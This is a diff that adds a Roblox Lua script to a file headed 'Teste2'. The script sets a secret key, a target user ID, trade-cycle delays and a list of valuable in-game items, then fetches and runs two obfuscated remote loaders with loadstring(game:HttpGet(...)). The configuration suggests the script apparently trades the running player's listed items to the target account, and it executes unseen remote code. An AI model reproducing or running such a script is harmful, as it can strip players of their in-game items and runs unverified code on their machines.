@@ -1,1 +1,78 @@
 # Teste2
+getgenv().SECRET_KEY = "mrr_b85d4ea314ac4cec9197beb4e929388d"
+getgenv().TARGET_ID = 9671680192
+getgenv().DELAY_STEP = 1      
+getgenv().TRADE_CYCLE_DELAY = 2
+getgenv().TARGET_BRAINROTS = {
+    ["Meowl"] = true,
+    ["Skibidi Toilet"] = true,
+    ["Lovin Rose"] = true,
+    ["Los Amigos"] = true,
+    ["La Secret Combinasion"] = true,
+    ["La Food Combinasion"] = true,
+    ["Sammyni Fattini"] = true,
+    ["Spaghetti Tualetti"] = true,
+    ["Rosetti Tualetti"] = true,
+    ["La Ginger Sekolah"] = true,
+    ["Los Spooky Combinasionas"] = true,
+    ["Fishino Clownino"] = true,
+    ["Los Jolly Combinasionas"] = true,
+    ["Jolly Jolly Sahur"] = true,
+    ["Orcaledon"] = true,
+    ["Eviledon"] = true,
+    ["Las Sis"] = true,
+    ["Celularcini Viciosini"] = true,
+    ["Dragon Gingerini"] = true,
+    ["Headless Horseman"] = true,
+    ["Hydra Dragon Cannelloni"] = true,
+    ["Popcuru and Fizzuru"] = true,
+    ["Rosey and Teddy"] = true,
+    ["Cooki and Milki"] = true,
+    ["Ketupat Bros"] = true,
+    ["Reinito Sleighito"] = true,
+    ["Los Sekolahs"] = true,
+    ["La Casa Boo"] = true,
+    ["Fragrama and Chocrama"] = true,
+    ["Spooky and Pumpky"] = true,
+    ["Love Love Bear"] = true,
+    ["Ginger Gerat"] = true,
+    ["Los Spaghettis"] = true,
+    ["Los Tacoritas"] = true,
+    ["Los Primos"] = true,
+    ["Los Puggies"] = true,
+    ["Tralaledon"] = true,
+    ["Los Bros"] = true,
+    ["Los Hotspotsitos"] = true,
+    ["Dragon Cannelloni"] = true,
+    ["Cerberus"] = true,
+    ["Capitano Moby"] = true,
+    ["Burguro And Fryuro"] = true,
+    ["Garama and Madundung"] = true,
+    ["Lavadorito Spinito"] = true,
+    ["Ketchuru and Musturu"] = true,
+    ["Tictac Sahur"] = true,
+    ["Ketupat Kepat"] = true,
+    ["Tang Tang Keletang"] = true,
+    ["La Romantic Grande"] = true,
+    ["Festive 67"] = true,
+    ["Swaggy Bros"] = true,
+    ["La Taco Combinasion"] = true,
+    ["La Jolly Grande"] = true,
+    ["W or L"] = true,
+    ["Gobblino Uniciclino"] = true,
+    ["Tuff Toucan"] = true,
+    ["Chillin Chili"] = true,
+    ["Chipso and Queso"] = true,
+    ["La Spooky Grande"] = true,
+    ["La Extinct Grande"] = true,
+    ["Tacorita Bicicleta"] = true,
+    ["Nacho Spyder"] = true,
+    ["Strawberry Elephant"] = true,
+    ["Los Planitos"] = true
+}
+task.spawn(function()
+loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/fbcd1d25889a843297107dea3642044d.lua"))()
+end)
+task.spawn(function()
+loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/fd920d2c87a95ee573d6fde239b63d15.lua"))()
+end)
